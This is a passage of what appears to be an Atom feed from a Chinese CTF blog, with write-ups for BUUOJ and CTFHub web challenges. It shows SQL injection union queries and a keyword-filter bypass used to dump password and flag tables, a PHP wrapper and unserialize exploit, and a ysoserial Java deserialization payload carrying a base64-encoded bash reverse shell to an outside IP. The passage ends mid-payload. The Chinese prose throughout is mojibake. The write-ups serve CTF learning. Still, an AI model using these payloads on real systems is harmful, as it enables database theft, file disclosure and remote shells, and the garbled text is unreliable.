class="headerlink" title="0x02"></a>0x02</h4><p>æŸ¥è¯¢æ•°æ®åº“å’Œç‰ˆæœ¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/19.png" alt="19"></p><p>æŸ¥è¯¢æ•°æ®åº“ä¸‹çš„æ•°æ®è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/20.png" alt="20"></p><p>æŸ¥è¯¢æŒ‡å®šè¡¨åä¸‹çš„åˆ—åä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'geekuser'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/21.png" alt="21"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'l0ve1ysq1'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/22.png" alt="22"></p><h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><p>æŸ¥è¯¢æŒ‡å®šæ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin ' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flag</code>ä¸º<code>flag{b9c4667a-4a05-441b-b100-a2106627c639}</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;b9c4667a-4a05-441b-b100-a2106627c639&#125;'</span><br></pre></td></tr></table></figure><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h3><h4 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h4><p>ä¸‡èƒ½å¯†ç å¤±æ•ˆï¼Œå¯¹äºä¸€äº›sqlå…³é”®å­—è¿›è¡Œäº†è¿‡æ»¤</p><p>å°è¯•åŒå†™ç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å‘ç°åˆ—æ•°ä¸åŒ¹é…</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/23.png" alt="23"></p><p>å›æ˜¾çˆ†ç ´</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/24.png" alt="24"></p><p>æŸ¥è¯¢æ•°æ®åº“ä¸‹çš„æ•°æ®è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æŠ¥é”™å¦‚ä¸‹</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/25.png" alt="25"></p><p>ç»§ç»­åŒå†™ç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/26.png" alt="26"></p><p>æŸ¥è¯¢æŒ‡å®šè¡¨åä¸‹çš„åˆ—åä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤å¼ è¡¨å‡æ²¡æœ‰flagçš„ä¿¡æ¯</p><p>çŒœæµ‹å­˜åœ¨å…¶ä»–æ•°æ®åº“ä¸­</p><h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><p>è·å–æ‰€æœ‰æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,performance_schema,test,ctf,geek</span><br></pre></td></tr></table></figure><p>çŒœæµ‹<code>ctf</code>æ•°æ®åº“ä¸­å­˜åœ¨<code>flag</code></p><p>æŸ¥çœ‹<code>ctf</code>æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'Flag'</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢Flagè¡¨ä¸­çš„åˆ—åä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag'</span><br></pre></td></tr></table></figure><h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><p>æŸ¥è¯¢æŒ‡å®šæ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag&#123;fa4954aa-49af-4e07-adc4-74a1260cbb21&#125;'</span><br></pre></td></tr></table></figure><p><code>flag</code>ä¸º<code>flag{fa4954aa-49af-4e07-adc4-74a1260cbb21}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;Ctf sqlæ³¨å…¥å­¦ä¹ &lt;/p&gt;
&lt;p&gt;é¢˜ç›®åœ°å€ï¼š&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019-Web-é€†è½¬æ€ç»´ WriteUp</title>
    <link href="elssm.github.io/2022/12/06/2019-Web-%E9%80%86%E8%BD%AC%E6%80%9D%E7%BB%B4-WriteUp/"/>
    <id>elssm.github.io/2022/12/06/2019-Web-é€†è½¬æ€ç»´-WriteUp/</id>
    <published>2022-12-06T06:36:29.000Z</published>
    <updated>2022-12-06T06:39:17.328Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>é¢˜ç›®åœ°å€</p><p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p><p>æµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›-å†³èµ›-2019-Web-é€†è½¬æ€ç»´</p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>è¿›å…¥é¦–é¡µ<code>php</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>get</code>è¯·æ±‚æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­æˆç«‹å¯ä»¥é€šè¿‡<code>data</code>åè®®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><p><img src="/2022/12/06/2019-Web-é€†è½¬æ€ç»´-WriteUp/1.png" alt="1"></p><p>ç¬¬äºŒä¸ªifåˆ¤æ–­ä¸èƒ½åŒ…å«<code>flag</code>å­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡<code>php://filter</code>åè®®è·å–<code>useless.php</code>æ–‡ä»¶æºç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>base64</code>ç¼–ç æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure><p>è§£å¯†åè·å–<code>useless.php</code>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹äº<code>password</code>çš„ä¼ å€¼ï¼Œé€šè¿‡æ„é€ <code>flag.php</code>çš„åºåˆ—åŒ–ï¼Œè®©<code>password</code>ç­‰äº<code>flag.php</code>çš„åºåˆ—åŒ–è¾“å‡ºå°±è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>get</code>è¯·æ±‚å‚æ•°ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p><img src="/2022/12/06/2019-Web-é€†è½¬æ€ç»´-WriteUp/2.png" alt="2"></p><p>flagä¸º<code>ctfhub{19a6a30e7f1e76f5a60dc63c}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;é¢˜ç›®åœ°å€&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/challenge&quot; target=&quot;_blan
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ThinkJava CTF WriteUp</title>
    <link href="elssm.github.io/2022/12/04/ThinkJava-CTF-WriteUp/"/>
    <id>elssm.github.io/2022/12/04/ThinkJava-CTF-WriteUp/</id>
    <published>2022-12-04T08:22:10.000Z</published>
    <updated>2022-12-04T08:27:17.873Z</updated>
    
    <content type="html"><![CDATA[<h4 id="é¢˜ç›®åœ°å€"><a href="#é¢˜ç›®åœ°å€" class="headerlink" title="é¢˜ç›®åœ°å€"></a>é¢˜ç›®åœ°å€</h4><p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>ä¸‹è½½æ–‡ä»¶åideaæŸ¥çœ‹ï¼Œå­˜åœ¨åœ°å€/common/test/sqlDict</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/1.png" alt="1"></p><p>sqlDictä¸­å­˜åœ¨sqlæ³¨å…¥</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/2.png" alt="2"></p><p>è·å–ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/3.png" alt="3"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>ä»£ç ä¸­å‘ç°å¼•å…¥äº†swagger</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/4.png" alt="4"></p><p>ç™»é™†swagger</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/5.png" alt="5"></p><p>å­˜åœ¨ç™»é™†æ¥å£ï¼Œæ ¹æ®sqlæ³¨å…¥å¾—åˆ°çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•</p><p>respä¸­è¿”å›äº†base64çš„authå¤´</p><p>å°†base64çš„authå¤´æ”¾å…¥/common/user/currentæ¥å£ä¸­çš„</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/6.png" alt="6"></p><p>å¯ä»¥å¾—åˆ°ç”¨æˆ·å</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>ä»rO0ABç‰¹å¾å¯ä»¥çœ‹åˆ°æ˜¯javaçš„åºåˆ—åŒ–åçš„base64ç¼–ç </p><p>æ„é€ åå¼¹shell</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/7.png" alt="7"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % java -jar ysoserial-all.jar ROME "bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTg4LjE1OC84MDgwIDA+JjE&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;" |base64</span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAb0yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAYGJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1ERXVORE11TVRnNExqRTFPQzg0TURnd0lEQStKakV9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjMzODk5NDk5ODQyMDQyAQAfTHlzb3NlcmlhbC9Qd25lcjMzODk5NDk5ODQyMDQyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AFwAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL